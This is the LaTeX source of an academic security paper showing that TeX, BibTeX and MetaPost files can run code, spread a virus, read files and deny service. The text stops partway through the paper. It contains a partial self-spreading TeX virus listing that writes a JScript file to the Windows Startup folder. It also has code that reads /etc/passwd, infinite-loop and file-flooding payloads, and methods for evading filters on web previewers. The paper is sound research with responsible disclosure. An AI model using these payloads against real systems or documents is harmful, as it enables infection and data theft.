\documentclass[nofontenc,pagenumbers,letterpaper,tight,twocolumn]{usenix09}
\usepackage{enumitem}
\usepackage{textcomp,listings}
\usepackage[sort&compress]{natbib}
\usepackage{amssymb}
\usepackage{booktabs}
\usepackage{trace}
\usepackage{mflogo}
\usepackage{ifpdf}
\ifpdf
\usepackage[breaklinks=true,pdfborder={0 0 0}]{hyperref}
\else
\usepackage[pdfborder={0 0 0}]{hyperref}
\usepackage{breakurl}
\fi
\newskip\displaymargin \displaymargin2em
\lstset{tabsize=4,upquote=true,basicstyle=\small\ttfamily,
columns=fixed,aboveskip=0pt plus2pt,belowskip=0pt plus2pt,
xleftmargin=\displaymargin}

\bibsep4pt plus2pt minus2pt
% Set this to true if we are generating the full paper
\newif\iffullpaper\fullpapertrue

% Set some of TeX's parameters
\clubpenalty=10000
\widowpenalty=10000
\hfuzz=0pt
\vfuzz=0pt
\overfullrule=5pt

% Squeeze the floats a little tighter together
\floatsep=3pt plus2pt minus1pt
\textfloatsep=3pt plus4pt minus1.5pt
\dblfloatsep=4pt plus2pt minus2pt
\dbltextfloatsep=4.5pt plus4pt minus2pt
\setcounter{topnumber}{1}
\setcounter{bottomnumber}{0}

% Some macros from the ltugboat class
\newcommand*\dash{\kern.16667em---\penalty\exhyphenpenalty\hskip.16667em\relax}
\makeatletter
\newcommand*\acro[1]{{%
        \ifx\@currsize\normalsize\small\else
        \ifx\@currsize\small\footnotesize\else
        \ifx\@currsize\footnotesize\scriptsize\else
        \ifx\@currsize\large\normalsize\else
        \ifx\@currsize\Large\large\else
        \ifx\@currsize\LARGE\Large\else
        \ifx\@currsize\scriptsize\tiny\else
        \ifx\@currsize\tiny\tiny\else
        \ifx\@currsize\huge\LARGE\else
        \ifx\@currsize\Huge\huge\else
        \typeout{unknown size: \meaning\@currsize}%
        \fi\fi\fi\fi\fi\fi\fi\fi\fi\fi
        #1}%
}
\newcommand*\La%
   {L\kern-.36em
        {\setbox0\hbox{T}%
         \vbox to\ht0{\hbox{$\m@th$%
                            \csname S@\f@size\endcsname
                            \fontsize\sf@size\z@
                            \math@fontsfalse\selectfont
                            A}%
                      \vss}%
        }}
\makeatother
\newcommand*\AllTeX{(\La\kern-.075em)\kern-.075em\TeX}
\newcommand*\BibTeX{\textsc{Bib}\kern-.08em\TeX}
\DeclareRobustCommand*\cs[1]{{\csfont\char`\\#1}}
\DeclareRobustCommand*\env[1]{{\csfont#1}}
\newcommand\csfont{\ttfamily\small}
% end of commands taken


% Make ^^5c easier to typeset
\newcommand*\esc{\texttt{\textasciicircum\textasciicircum5c}}

% Some macros for making the table of vulernabilities
\newcommand*\svmark[1][\normalsize]{{#1\checkmark}}
\newcommand*\svempty[2]{\expandafter\let\csname\svtemp#1\endcsname=\empty}
\newcommand*\svuse[2]{&\csname\svtemp#1\endcsname}
\newcommand*\dosv[1]{%
	#1{loop}{\cs{loop}}%
	#1{def}{\cs{def}}%
	#1{input}{\cs{input}}%
	#1{atinput}{\cs{@input}}%
	#1{csname}{\cs{csname}}%
	#1{catcode}{\cs{catcode}}%
	#1{esc}{\esc}%
	#1{openin}{\cs{openin}}%
	#1{begin}{\cs{begin}}%
}
\newcommand*\sitevuln[3]{%
	\xdef\svtemp{#1}%
	\ifx\svtemp\empty \errmessage{Invalid argument}\fi
	\dosv\svempty
	\expandafter\def\csname #1row\endcsname{%
		\xdef\svtemp{#1}%
		#2~\cite{#1}%
		\dosv\svuse\\}%
	\edef\svtempb{#3}%
	\expandafter\parsesv\svtempb,\par}
\def\parsesv#1,#2\par{%
	\edef\svtempb{#1}%
	\ifx\empty\svtempb
	\else
		\expandafter\ifx\csname \svtemp#1\endcsname\relax
			\errmessage{Invalid option #1}%
		\fi
		\expandafter\let\csname \svtemp#1\endcsname=\svmark
	\fi
	\edef\svtempb{#2}%
	\ifx\empty\svtempb
	\else
		\parsesv#2\par
	\fi}
\newcommand*\svheader[2]{&#2}
\newcommand*\headerrow{\dosv\svheader\\}
\newcommand*\svmakespec[2]{@{\hspace{1.2em}}c}
\newcommand*\svspec{l\dosv\svmakespec}

\title{Are Text-Only Data Formats Safe?\\
  Or, Use This \LaTeX\ Class File to Pwn Your Computer}
\addauthor{Stephen Checkoway}{UC San Diego}
\addauthor{Hovav Shacham}{UC San Diego}
\addauthor{Eric Rescorla}{RTFM, Inc.}
\begin{document}
\maketitle
\phantomsection
\addcontentsline{toc}{section}{\abstractname}
\begin{abstract}
  We show that malicious \TeX, \BibTeX, and \MP\ files can lead to
  arbitrary code execution, viral infection, denial of service, and
  data exfiltration, through the file~I/O capabilities exposed by
  \TeX's Turing-complete macro language.  This calls into doubt the
  conventional wisdom view that text-only data formats that do not
  access the network are likely safe.  We build a \TeX\ virus that
  spreads between documents on the MiK\TeX\ distribution on
  Windows~XP; we demonstrate data exfiltration attacks on
  web-based \LaTeX\ previewer services.
\end{abstract}

\section{Introduction}

The divide between ``code'' and ``data'' is among the most fundamental
in computing.  Code expresses behavior or functionality to be carried
out by a computer; data encodes and describes an object (a photo, a
spreadsheet, etc.\@) that is conceptually inert, and examined or
manipulated by means of appropriate code.
%
The complexity of data formats for media manipulated by desktop
systems, together with the inability of programmers to write
bug-free code, has generated a stream of exploits in common media
formats.  These exploits take advantage of software bugs to induce
arbitrary behavior when a user views a data file, even seemingly
simple ones such as Windows' animated cursors~\cite{gdi-vuln}.
%
The inclusion of powerful scripting languages in file formats like
Microsoft's Word has led to so-called macro
viruses,\footnote{Amusingly, some advocacy documents list ``no macro
  viruses'' as an advantage \TeX\ has over Word; see, e.g.,
  \url{http://web.mit.edu/klund/www/urk/texvword.html}.} and to
PostScript documents that violate a paper reviewer's
anonymity~\cite{infoflow}.
%
These two trends have combined in the use of PDF files that include
JavaScript to exploit bugs in Adobe's Acrobat; by one
report~\cite{agtr09}, some 80\% of exploits in the fourth quarter of
2009 used malicious PDF files.  Thus the complexity and opacity of
data formats has made data behave more like code.  On the other side,
a line of work culminating in the English-language shellcode of Mason
et~al.~\cite{mason-et-al:english-shellcode:ccs09} has shown how to
make code look more like data.
\looseness=-1

In this paper, we present a case study of another unsafe data format,
one that is of particular interest to the academic community: \TeX.
Unlike Word documents or PDF files, the input file formats associated
with \TeX\ are all plain text and thus, na{\"\i}vely, ``safe.''
\LaTeX\ and \BibTeX\ files are routinely transmitted in research
environments\dash a practice we show is fundamentally unsafe.
Compiling a document with standard \TeX\ distributions allows total
system compromise on Windows and information leakage on \acro{UNIX}.

\paragraph{\TeX\ is unsafe.}
Donald Knuth's \TeX\ is the standard typesetting system for
mathematical documents.  It is also a Turing-complete macro language
used to interpret scripts from potentially untrusted sources.  In
this paper, we show that a specific capability exposed to \TeX\
macros\dash the ability to read and write arbitrary files\dash makes
it (and other commonly used bits of \TeX ware, such as \BibTeX~and
\MP) a threat to system security and data privacy.

We demonstrate two concrete attacks.  First, as an example of running
arbitrary programs, we build a \TeX\ virus that affects recent
MiK\TeX\ distributions on Windows~XP, spreading to all of a user's
\TeX\ documents.  The virus requires no user action beyond compiling
an infected file.  Our virus does nothing but infect other documents,
but it could download and execute binaries or undertake any other
action it wishes.

Second, we describe data exfiltration and denial~of service attacks
against web-based \LaTeX\ and \MP\ previewer services. Our findings have
implications for any online service that compiles or hosts \TeX\ files
on behalf of untrusted users, including the Comprehensive \TeX\
Archive Network (CTAN) and Cornell University Library's arXiv.org
preprint server.

\paragraph{Defenses.}
The lesson we teach here is one learned over and over: As the Internet
has made document sharing easier and more pervasive, file formats once
considered trusted have become attack vectors, either because the
parser was insecure or because the scripting capabilities exposed to
files in the format have unforeseen consequences.  Barring a
fundamental change in the way that data-handling code is designed and
implemented, we must set aside the idea that data, unlike code, can be
``safe''; we should instead treat data-processing code as inherently
insecure and design systems that can withstand its
compromise\dash as, for example, Bernstein has
advocated~\cite{djb:qmail-retrospective:csaw07}.

For \TeX\ specifically, there are three main approaches to protect
against abuse of interpreted languages. First, one could audit the
interpreter for vulnerabilities that allow the attacker to subvert the
intended restrictions on the scripting language.  Such vulnerabilities
are commonly found in supposedly safe file formats and frequently
allow the attacker to execute arbitrary code, as in Dowd's recent
ActionScript exploit~\cite{Dow08}.  We know of no such vulnerabilities
in \TeX, but their absence does nothing to defend against capabilities
granted to \TeX\ scripts by design, including the file I/O that forms
the basis for our attacks.  A second approach is to attempt to
establish a safe subset of commands, through blacklisting,
whitelisting, or other forms of filtering or rewriting.  (This is akin
to code-rewriting systems in which code is verified safe at
load-time~\cite{necula-lee:pcc:osdi96}.)  As we show below, the
malleability of the \TeX\ language makes it difficult to filter
safely.  A final, more drastic approach is to treat the entire system
as untrusted and sandbox it using the operating system's isolation
mechanisms; as we show, this seems like the most promising approach
for \TeX.

Observations similar to the ones we have made for~\TeX\ apply to other
data formats that are programmable (e.g., using JavaScript) or
require complicated and error-prone parsers.  Ensuring that all
programs that process such formats are appropriately sandboxed
represents a reimagination of the way traditional desktop environments
are engineered; a redesigned system would dovetail with the principles
laid out by Bernstein~\cite{djb:qmail-retrospective:csaw07}.

\section[Low-level details of TeX]{Low-level details of \TeX}
\label{sec:tech}
In this section, we recall some features of the \TeX\ programming
language and the \LaTeX\ macro package. The discussion covers only the
behaviors on which our attack relies; for more complete coverage we
refer the reader to~\cite{knuth,src,etexum}. Even so, the discussion
is quite technical. Readers not interested in \TeX\ arcana are
encouraged to continue to Section~\ref{sec:not-safe}, referring back to
this section for reference as necessary.

\paragraph{Important control sequences.}
\TeX\ and \LaTeX\ behavior is principally controlled by a variety
of control sequences, conventionally a sequence of characters prefaced
by a backslash (\verb^\^).
Below are some of the control sequences we will use in the remainder
of the paper.
\begin{description}[nolistsep]
\item[\cs{catcode}] \TeX\ primitive that changes the category code of
a character: \lstinline!\catcode`\X=0! changes the default category
code of X from ``letter'' to ``escape character.''

% This needs a little more space and I'd rather have it be before TeX
% than split between the words.
\item[\cs{csname}\,\,\ldots\cs{endcsname}]\hskip0pt plus.25em \TeX\ primitive that
builds control sequences:
\lstinline!\csname foo\endcsname! is (almost) the same as
\cs{foo}.

\item[\cs{include}] \LaTeX\ macro that behaves as \cs{input} except
that the included material begins on a new page:
% Convince deps generator that \include{file} isn't really a dep
{\catcode`\%=9
%\lstinline!\include{file}!.}

\item[\cs{input}] \TeX\ primitive (redefined by \LaTeX) that reads the
contents of its space-separated argument as if the text were typed
directly into the main document:
% Convince deps generator that \input{file} isn't really a dep
{\catcode`\%=9
%\lstinline!\input file! (or in \LaTeX,
%\lstinline!\input{file}!).}

\item[\cs{@input}] \LaTeX\ internal similar to \TeX's \cs{input}.

\item[\cs{@@input}] \LaTeX\ internal identical to \TeX's \cs{input}.

\item[\cs{jobname}] \TeX\ primitive that expands to the name of the
file being compiled without its extension.

\item[\cs{newread}] \AllTeX\ macro to allocate a new stream for file
reading:
\lstinline!\newread\file!.

\item[\cs{openin}] \TeX\ primitive that opens a file and
associates it with a read stream: \lstinline!\openin\file=foo.ext!.

\item[\cs{read}] \TeX\ primitive that reads a line from a file,
assigning each character the category code currently in effect:
\lstinline!\read\file to\line! stores the tokens produced from the
file into \cs{line}.

\item[\cs{readline}] $\varepsilon$-\TeX\ extension that behaves as
\cs{read} but assigns only the category codes ``other'' and ``space.''

\item[\cs{relax}] \TeX\ primitive that takes no action; just relaxes.

\item[\cs{write}] \TeX\ primitive that writes an expanded token list
to a file: \lstinline!\write\file{foo}!.
\end{description}
Other control sequences are used below, but either their behavior is
clear or their use is not of central importance.

\paragraph{\TeX\ parsing behavior.}

\TeX's behavior is usually described in terms of a ``mouth'' and a
``stomach.'' The exact behavior is fairly complex but the following
simplified description will suffice for this paper. \TeX's mouth
reads each line of input character by character and produces a stream
of tokens which are acted on by \TeX's stomach.

There are two types of tokens produced by \TeX's mouth\dash character
tokens and control sequences\dash and their
production is governed by the \emph{category code}\dash an integer in
0--15\dash of the characters read. At any given time,
each input character is associated with a single
category code. 
Except in certain situations, expandable tokens (e.g., macros) are expanded
into other tokens en route to \TeX's stomach. Once in the stomach,
\TeX\ processes the tokens, performing assignments\dash such as
changing category codes\dash and typesetting.

When \TeX\ encounters two identical characters tokens with category code 7,
(by default only \textasciicircum\,), followed by two lowercase hexadecimal
numbers, it treats the four characters as if a single character with
\acro{ASCII} value the hexadecimal number had appeared in the input.

\section{Malicious \TeX\ usage}
\label{sec:not-safe}
It is generally assumed that it is safe to process arbitrary,
untrusted documents with \TeX, and by extension \LaTeX. However, this
is untrue; in fact, \TeX\ can write arbitrary files to the filesystem.
On \acro{UNIX} systems, \TeX\ output is typically restricted to the local
directory and its subdirectories, which limits the scope of attack
somewhat. However, MiK\TeX, the most common \TeX\ distribution for Windows,
has no internal controls on where output can be written.

This ability to write to any file presents an obvious danger in that
important files can be overwritten or the computing environment
can be changed by the introduction of new files. The average user's
computer is a target-rich environment, with any number of
files which, when modified, allow the attacker to execute
code in the user's environment. For concreteness, we focus on
a single case: on Windows~XP we can write 
JScript files to a user's \path|Startup|
directory which will be executed by the Windows Script Host facility 
at login.

Once the script is executed, one possibility is it could download and
run a binary of the attacker's choice using the
\texttt{Microsoft.XMLHTTP} object. For example, this could cause the
computer to become part of a botnet.

There is one technical hurdle that must be overcome in order to write
to the \path|Startup| directory, namely spaces in the file path, which
\TeX\ does not ordinarily allow. However, 
we can leverage Windows'
compatibility with older programs that expect file and directory names
in 8.3 format. For example, \path|Start Menu| can be
specified as \path|STARTM~1|. We use this compatibility in our
proof-of-concept for application execution, a \LaTeX\ virus.
\looseness=1

\subsection{A two-stage virus}
\label{sec:virus}
\begin{lstlisting}[float=*t,caption={Virus code with JScript
omitted.},escapechar=\_,label=lst:virus,language={[LaTeX]TeX}]
%%%%SPLOIT%%%%
{\newwrite\w\let\c\catcode\c`*13\def*{\afterassignment\d\count255"}\def\d{%
\expandafter\c\the\count255=12}{*0D\def\a#1^^M{\immediate\write\w{#1}}\c`^^M5%
\newread\r\openin\r=\jobname \immediate\openout\w=C:/WINDOWS/Temp/sploit.tmp
\loop\unless\ifeof\r\readline\r to\l\expandafter\a\l\repeat\immediate\closeout
\w\closein\r}{*7E*24*25*26*7B*7D\immediate\openout
\w=C:/DOCUME~1/ADMINI~1/STARTM~1/PROGRAMS/STARTUP/sploit.js \c`[1\c`]2\c`\@0
\newlinechar`\^^J\endlinechar-1*5C@immediate@write
@w[fso=new ActiveXObject("Scripting.FileSystemObject");foo=^^J
_$\langle$11 lines of JScript omitted$\,\rangle$_
f(fso.GetFolder("C:\\Documents and Settings\\Administrator"));}m();]
@immediate@closeout@w]}%
%%%%SPLOIT%%%%
\end{lstlisting}

The virus attacks in two phases. In the first phase, it copies the payload to
disk and install the appropriate JScript file into \path|Startup|.
In the second phase, the JScript file finds other \LaTeX\
documents on the disk and infects them.

The first phase takes advantage of the fact that the \TeX\
engine used in MiK\TeX\dash and indeed in all modern \TeX\
distributions\dash is pdf\TeX\ which contains the $\varepsilon$-\TeX\
extension \lstinline!\readline!~\cite{pdftexum}. First, \cs{readline} is used
to read the document being compiled line by line and write an exact
copy to \path|C:\WINDOWS\Temp\sploit.tmp|. Then, a JScript file
containing the second phase of the virus is written to the
Administrator's \path|Startup| directory. Since the exact details of
how this is accomplished are rather technical, they are omitted;
however, the code for the first phase is given in Listing~\ref{lst:virus}.

The second phase, written in JScript, first creates a
\texttt{FileSystemObject}, then it reads the \path|sploit.tmp| file, and
extracts all of the \TeX\ code between two marker lines\dash the virus
code. Next, it finds all of the files in the \path|Administrator|
directory with the extension \texttt{.tex}. Finally, those files which
contain \lstinline!\end{document}! have the virus inserted just before the end.

In total, the virus requires two marker lines and 21 80-column lines of
\TeX. The \TeX\ code  is given in Listing~\ref{lst:virus};
in the interest of not providing a complete, working virus,
the majority of the JScript is omitted, but the remaining code
is straightforward and we have tested it in our own systems.
Moreover, it should be clear
that we could in principle execute \emph{any} JScript code and do far
more damage than just modifying \LaTeX\ files on disk.

An earlier proof-of-concept \TeX\ virus for NetBSD was designed in
1994 by Keith McMillan~\cite{mcmillan}. McMillan's modifies a user's
GNU Emacs initialization file (something no longer possible with Web2C
based \TeX\ distributions) and relies on the user's visiting a
directory in Emacs to spread to other \texttt{.tex} files in that
directory. By contrast, our virus works on modern Windows systems and
requires no user interaction beyond an eventual relogin.

\subsection[BibTeX databases]{\BibTeX\ databases}
One potential barrier to using \TeX\ for application execution is
that the user might notice any malicious code present in files 
he is editing. \BibTeX\ databases provide a two-fold solution by
(1) moving the malicious code out of the main document so it is less
noticeable; and (2) allowing
the code to be widely distributed.

\BibTeX\ is a program used to turn a database of references (the
\texttt{.bib} files) into \LaTeX\ code for a bibliography consisting
of the references for the citations in the paper (the \texttt{.bbl}
files). Subsequent runs of \LaTeX\ cause the text of the generated
\texttt{.bbl} files to be \cs{input} into the document at the
specified location. It is quite common for users to simply download
\BibTeX\ entries or even entire databases, such as the \acro{RFC} \BibTeX\ 
files provided by Miguel Garcia Martin. In the latter case, the
database often contains a large number of entries which the user does
not carefully examine; indeed he may never even look at the 
entries but rather search the database with a
tool such as Ref\TeX.  This facilitates an attack since malicious code
may be harder to notice in a large file full of unused information.

Each \BibTeX\ entry has the form \texttt{@type{\ldots}}, where
\texttt{type} is one of the types understood by a particular style
such as \texttt{book} or \texttt{article}. There is an additional
entry type, \texttt{@preamble}, which inserts text verbatim into the
\texttt{.bbl} file just before the bibliography. In addition, multiple
\texttt{@preamble} entries are concatenated into a single line in the
order they appear in the database. Thus, malicious code can be
separated into arbitrarily many parts and scattered (in order)
throughout the \texttt{.bib} file, and will be executed regardless
of which entries the author actual cites.

Other file formats that embed \TeX\ commands can also be used as
attack vectors. Examples include graphics languages such as \MP\ and
Asymptote.

\subsection{Class and style files}
Base \LaTeX\ functionality is extended through the use of class files
which set the overall format of the document to be produced and style
files which typically change the behavior of one aspect of the
document. At present, CTAN has 1080 user contributed \LaTeXe\
packages. The MiK\TeX\ repository on CTAN has 1908 packages. Similar
to the situation with large \BibTeX\ databases, most users never
examine a style or class file. If a popular package on one of the many
CTAN mirrors were modified to contain malicious code, it might affect
a large number of \LaTeX\ users before being discovered.

Rather than corrupting an existing package, an attacker could submit a
package, e.g.,  purporting to implement the guidelines for submission
to a conference, to CTAN. Anyone using such the package would be at
risk.
\looseness=-1

\section{Web-based \LaTeX\ previewers}
We now turn our attention to a slightly harder target. There are more
than a dozen web-based services that compile \LaTeX\ files on users'
behalf and return the resulting \acro{PDF}s. We have designed
successful exfiltration and file writing attacks on most of these services.
Moreover, the filtering mechanisms
devised by these services were largely ineffective against our
attacks. 
We have disclosed the vulnerabilities we found to the affected services
to the operators, with universally positive responses. As a result, 
number of operators changed their security policy
or removed the previewer altogether.


\subsection{Reading files}
\label{sec:read}
All properly configured web servers allow only a subset of the files
on the computer to be visible to connecting clients. In this section,
we show how we can use the power of \TeX\ to read files from web
servers that expose a \LaTeX\ interface.  

There are various ways that an attacker can use the
exposed \LaTeX\ interface to read files not exposed by the web server.
The two most obvious approaches are using \cs{input} or
\cs{include}
to interpolate the text of the file into the \TeX\ input and hence the
output document. One minor problem with
this approach is that we have lost line breaks in the input file since
\TeX\ will treat them as spaces in the usual manner.  One way to avoid
losing line breaks, as well as circumventing blacklisting of such
control sequences, is to use \TeX's ability to read files. The
basic idea is to open a file for reading, read it one line at a time,
and feed it to the typesetting engine. The code for this is given in
Listing~\ref{lst:readfile}.

\begin{lstlisting}[float,caption={Reading a file a line at a
time.},label=lst:readfile,language={[LaTeX]TeX}]
\openin5=/etc/passwd
\def\readfile{%
	\read5 to\curline
	\ifeof5	\let\next=\relax
	\else	\curline~\\
			\let\next=\readfile
	\fi
	\next}%
\ifeof5	Couldn't read the file!%
\else	\readfile \closein5
\fi
\end{lstlisting}

An additional problem is processing characters
in the input that \TeX\ considers to be special. For example,
running the code in Listing~\ref{lst:readfile} on one of the authors'
computer produces the error ``You can't use `macro parameter character
\#' in horizontal mode.'' This is easily fixed by changing the
category code for \# with \lstinline!\catcode`\#=12!  before the
\cs{read} command in Listing~\ref{lst:readfile} and restoring it
afterward. Other special characters can be handled in an analogous
manner. Alternatively, the \cs{readline} primitive from
$\varepsilon$-\TeX\ can be used.

\subsection{Writing files}
As discussed in Section~\ref{sec:not-safe}, 
Web2C-based \TeX\ distributions such as te\TeX\ and \TeX\
Live typically only allow files to be 
output in the current directory or
a subdirectory. However, this still leaves room for attacks.
A common way to generate images for displaying in a
web page is to make a temporary directory\dash for example in
\path|/tmp|\dash and generate the needed files inside that directory.
Afterward, the images are copied elsewhere or used immediately and
then the whole directory is deleted. A previewer that generates images
in a web-accessible directory and then cleans up the specific files it
knows will be generated but not needed may be vulnerable to attack.
For example, on a web server that allows \acro{PHP}, an attacker need
only open a file using \cs{openout} and use \cs{write} to write
\acro{PHP} code, which would then be executed by the server when the
attacker did an \acro{HTTP} request for that file.
If the previewer is based on MiK\TeX, these constraints are relaxed and
attack is even easier.

\subsection{Denial of service}
Any previewer that allows the \TeX\ looping construct
\cs{loop}\,\ldots\cs{repeat} or the definition of new macros is at
risk of a denial of service attack. The shortest form of this attack
is \lstinline!\loop\iftrue\repeat!. Another way to achieve this is to
use
\lstinline!\def\nothing{\nothing}!. The loops cause \TeX\ to burn
\acro{CPU} cycles without actually producing anything. If enough
instances of it happen at once, the computer will slow to a crawl and
no more useful work will be possible until the processes are killed.

One extension of this attack is to cause \TeX\ to produce very large
files, potentially filling up the disk. The way to do this without
exhausting \TeX's memory is to produce pages of output so that \TeX\
will discard from its memory the pages it has already processed. This
can be done using \cs{shipout}\dash a \TeX\ primitive that
writes the contents of the following box to the output file.

\subsection{Escaping math mode}
Many of the \LaTeX\ previewers on the web were designed only to
display mathematics. As a result, the text that the user inputs is
copied into a mathematics environment in an otherwise-complete \LaTeX\
document to pass off to \LaTeX\ for compilation. The most common way
to do this is to put the input inside a \env{eqnarray*} or
\env{align*} environment.  To get out of math mode, we simply start
the input with
\catcode`\%=9
%\lstinline!\end{eqnarray*}!
%(resp.\ \lstinline!\end{align*}!)
and to ensure that the document compiles, we end the input with
%\lstinline!\begin{eqnarray*}!
%(resp.\ \lstinline!\begin{align*}!). Alternatively, to get out of
\catcode`\%=14
math mode temporarily, we can use \cs{parbox}.

\subsection{Evading Filters}
The natural defense against the attacks described in this section
is to filter out dangerous commands. However, this is more difficult
than it first appears. In this section, we describe a number of
techniques for evading simple filters.
For concreteness, the
discussion below is limited to \cs{input}, but most of the techniques are
applicable to all the commands discussed above.

Using some of the features and control sequences described in
Section~\ref{sec:tech}, we can use \cs{input} without having to write
the literal string \cs{input}. For example, we can use
\lstinline!\csname input\endcsname!. This attack is more likely to
succeed than \cs{input} because \cs{csname} is used mostly by package
writers and only rarely by authors.

An attacker can evade simpleminded filters by using
\cs{catcode} to change the category
code of another character to ``escape'' and use that in place of
\cs{}. For example, one can change the category code of `X' and use
\lstinline!Xinput!.
Additionally, one can use 
\esc\ in place of~\cs{} as described in Section~\ref{sec:tech}. Of
course, other characters could be replaced, not simply \cs{}, for
example, if the word ``input'' is not allowed anywhere in the
previewer's input, then `p' can be replaced with
\texttt{\textasciicircum\textasciicircum70}.


Yet another possibility is for an attacker to invoke \cs{@input} or
\cs{@@input} directly\dash this requires using
either \cs{makeatletter} or \cs{catcode} to change the
category code of @ to ``letter.'' In all likelihood, there are a
number of \LaTeX\ internals that could be used to facilitate an
attack. These are much less well known outside of the package writing
community and are thus likely to escape the notice a web site
administrator attempting to secure a \LaTeX\ previewer. 

One can make use of a peculiarity of the implementation of \LaTeX\
\emph{environments} to evade filters that look for control sequences
starting with \cs{}. A \LaTeX\ environment \env{foo}
consists of a pair
\lstinline!\begin{foo}!\,\ldots\lstinline!\end{foo}!. The
\lstinline!\begin{foo}! and \lstinline!\end{foo}! macros execute the
control sequences \cs{foo} and \cs{endfoo} using \cs{csname}. Thus, one
can execute any control sequence by passing its name as the argument to
\cs{begin}. If \cs{endfoo} is not defined, \TeX\
defines it as \cs{relax}. For example,
\lstinline!\begin{TeX}\end{TeX}! eventually executes
\lstinline!\TeX\relax!. Since the backslash before the
control sequence name is not present when using \cs{begin}, it does not
trigger a filter looking for particular control sequences which begin
with \cs{}. One can pass arguments to a macro simply by
placing the argument after the \cs{begin}. For example, one
can read files with \lstinline!\begin{input}{/file/path}\end{input}!.

\subsection{\MP}
\iffullpaper
\MP\ is a declarative, macro programming language, based on \MF,
used to produce vector graphics, often for inclusion into \AllTeX\
documents. Like \TeX, \MP\ is an extremely powerful language and as
such, there are dangers associated with providing a \MP\ previewer on
the web.

The first such danger is the ability to write arbitrary single line
\TeX\ fragments. Any literal text that appears between \texttt{btex}
and \texttt{etex} is written to a \texttt{tex} file which is compiled
by \TeX\ and the result is included into the \MP\ output; this is
often used for typesetting labels. \MP\ provides a way to include
arbitrary, multi-line \TeX\ code at the beginning of the \texttt{tex}
file used with \texttt{btex\ldots etex} using the
\texttt{verbatimtex\ldots etex} construct.  The \textsf{latexMP}
package makes using \LaTeX\ for typesetting easy. It includes a macro
\texttt{textext} which takes a string argument containing a single
line of \LaTeX\ to typeset. As a result, all of the attacks discussed
thus far work just as well for a \MP\ previewer that allows the
\texttt{btex\ldots etex} construction or allows the use of the
\textsf{latexMP} package. Even worse, from a web site administrator's
point of view, is that since \textsf{latexMP} allows strings and not
just literal data to be typeset, attempting to sanitize input to the
\texttt{textext} macro requires performing a data flow analysis that
can prove that no harmful control sequences make it into the string
ultimately used as the argument.

A second danger is that \MP\ includes commands for reading and writing
files, \texttt{readfrom} and \texttt{write}, respectively. To read an
arbitrary file such as \path|/etc/passwd|, we can use the code in
Listing~\ref{lst:mp}.

\begin{lstlisting}[float,language=MetaPost,caption={Reading a file with
\MP.},label=lst:mp,morekeywords={exitif}]
picture p;
p := nullpicture;
forever:
	string line;
	line := readfrom "/etc/passwd";
	exitif line = EOF;
	p := thelabel.lrt( line,
		 (0, ypart llcorner p) );
	draw p;
endfor;
\end{lstlisting}

As seen in Listing~\ref{lst:mp}, \MP\ has a command \texttt{forever}
that loops forever. In addition to \texttt{forever}, \MP\ allows macro
definitions via \texttt{def} which can be used to simulate looping. As
before, we can actually do more than simply burn \acro{CPU} cycles. We
can try to write large files or write many files. For example,
Listing~\ref{lst:mploop} will produce a maximum of 4096 files per
minute. This limit is due to \MP's maximum numeric value being
slightly under 4096.

\begin{lstlisting}[texcl=true,language=MetaPost,float,caption={Creating 4096
files per minute with
\MP.},label=lst:mploop,morekeywords={filenametemplate}]
filenametemplate "%j%c%y%m%d%H%M";
i := 0;
forever:
	beginfig(i);
		% Add \MP\ code here
	endfig;
	if i = 4095:
		i := 0;
	else:
		i := i + 1;
	fi;
endfor;
\end{lstlisting}

One final avenue of attack against a \MP\ previewer is to use the
\texttt{scantokens} command. It takes a string argument and reads the
string as if the contents had been written literally in the file at
that point, with a few exceptions. In particular, any of the attacks
listed here could be created using string operations and then passed
to \texttt{scantokens}.
\else
We note that the \MP\ language can also be abused to mount
file reading and denial of service attacks; we describe 
details of attacks using \MP\ in the full version of this article.
\fi

\subsection{Evaluation}
\label{sec:eval}
% equation
\sitevuln{mb}{MathBin.net}{csname,catcode,esc,begin,openin,atinput,loop,def}
\sitevuln{leefti}{\LaTeX\ Eqn. Ed. for the Internet}{openin,def,begin,atinput,loop}
\sitevuln{hupdlee}{Hamline \LaTeX\ Eqn.
Ed.}{input,esc,csname,catcode,atinput,openin,def,loop,begin}
\sitevuln{roee}{Roger's Online Eqn.
Ed.}{input,csname,catcode,esc,openin,atinput,loop,def,begin}
\sitevuln{lee}{\LaTeX\ Eqn.
Ed.}{input,csname,catcode,esc,openin,def,loop,begin}
\sitevuln{mu}{mathURL\textsuperscript\dag}{atinput,csname,catcode,esc,begin,openin,def,loop}

% full document
\sitevuln{lp}{\LaTeX\
Previewer}{csname,catcode,esc,begin,openin,atinput,loop,def}
\sitevuln{loc}{\LaTeX\ Online
Compiler}{atinput,csname,catcode,esc,openin,loop,def,begin}
\sitevuln{ssl}{ScienceSoft
\LaTeX}{atinput,catcode,csname,esc,openin,begin,def,loop}
\sitevuln{wl}{Web
\LaTeX}{input,atinput,catcode,csname,begin,esc,openin,def,loop}
\sitevuln{ll}{\LaTeX
Lab}{openin,input,atinput,catcode,csname,begin,esc,def,loop}
\sitevuln{st}{Scrib\TeX\textsuperscript\ddag}{def,loop}

% TeX
\sitevuln{mt}{MathTran}{}

\begin{table*}
\footnotesize
\renewcommand\csfont{\ttfamily\footnotesize}
\centering
\begin{tabular}{\svspec}
\toprule
\headerrow
\midrule
\leeftirow
\roeerow
\leerow
\murow
\hupdleerow
\mbrow
\addlinespace
\strow
\lprow
\sslrow
\llrow
\locrow
\wlrow
\addlinespace
\mtrow
\bottomrule
\end{tabular}
\caption{\LaTeX\ previewer vulnerabilities. The \cs{loop} and \cs{def}
columns contain a \svmark[\small] if the attack could be used to
cause a denial of service by producing an infinite loop. The other
columns contain a \svmark[\small] if the attack can be used to
read input.\newline
\textsuperscript\dag The only files we were able to read were
the input and the ones produced by \LaTeX. It is unknown if others
were accessible.\newline
\textsuperscript\ddag The previewer contains a timeout
of several seconds.}
\label{tab:vuln}
\end{table*}

We tested the aforementioned attacks against a variety of web
sites running \LaTeX\ previewers. The previewers examined vary in the
type of content they were meant to accept from a single mathematical
expression to an entire \LaTeX\ document.

Since our goal was to probe but not attack these web sites, file reading was
restricted to files with no security implications such as
\path|/etc/hostname| on \acro{UNIX} and \path|C:\WINDOWS\win.ini| on
Windows. Rather than actually produce multiple infinite looping
instances, we test that macros can be defined by defining benign macros
using \cs{def}, \cs{gdef}, etc. Looping via \cs{loop} is attempted
using the code in Listing~\ref{lst:testloop}. If \cs{loop} is allowed,
the fragment will output ``before after before.'' Once it has been
determined which of the looping constructs work, a single infinite
loop is produced to check for the presence of timeouts.\footnote{Since
